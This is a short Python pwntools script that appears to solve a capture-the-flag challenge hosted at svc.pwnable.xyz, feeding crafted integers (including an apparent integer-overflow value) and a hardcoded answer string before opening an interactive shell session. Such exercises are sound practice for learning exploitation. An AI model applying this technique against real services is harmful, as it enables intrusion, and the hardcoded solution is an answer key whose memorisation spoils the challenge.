from pwn import *

#p  = process('./challenge')
p = remote('svc.pwnable.xyz',30008)

p.recvuntil(b'x: ')
p.sendline(b'0')
p.recvuntil(b'y: ')
p.sendline(str(2**32 - 1337).encode())
p.send(str(349497))
p.send(b' ')
p.sendline(str(12289).encode())
solution = b"2801872743 2812376909 3552466933 3876839801 1788727279"
p.sendline(solution)


p.interactive()
